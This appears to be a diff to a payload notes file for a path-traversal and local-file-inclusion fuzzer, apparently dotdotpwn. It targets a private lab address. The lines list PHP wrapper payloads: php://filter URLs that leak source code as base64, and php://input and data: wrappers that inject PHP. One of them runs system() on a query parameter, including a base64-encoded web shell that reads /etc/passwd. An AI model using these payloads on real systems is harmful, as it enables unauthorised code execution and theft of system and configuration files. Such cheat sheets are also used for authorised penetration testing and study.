@@ -2,12 +2,13 @@ http://192.168.1.103:80/index.php?system=TRAVERSAL
 http://192.168.1.103:80/index.php?system=php://filter/convert.base64-encode/resource=TRAVERSAL
 http://192.168.1.103:80/index.php?system=php://filter/read=convert.base64-encode/resource=TRAVERSAL
 #
+# URLS need to have at least one / after the port. eg http://127.0.0.1:1337/
 #
 #PHP filters
 #?file=php://filter/convert.base64-encode/resource=index
-#?file=php://filter/read=convert.base64-encode/resource=config	same, but add a filter/read
-#?file=php://input		payload sent in POST request
-#?file=php://data                                           #does not work with dotdotpwn
+#?file=php://filter/read=convert.base64-encode/resource=config	#same, but add a filter/read
+#?file=php://input		                                          #payload sent in POST request
+#?file=php://data                                               #does not work with dotdotpwn
 # data:text/plain,<?php phpinfo(); ?>
 # data:,<?system($_GET['x']);?>&x=ls
 # data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=cat /etc/passwd
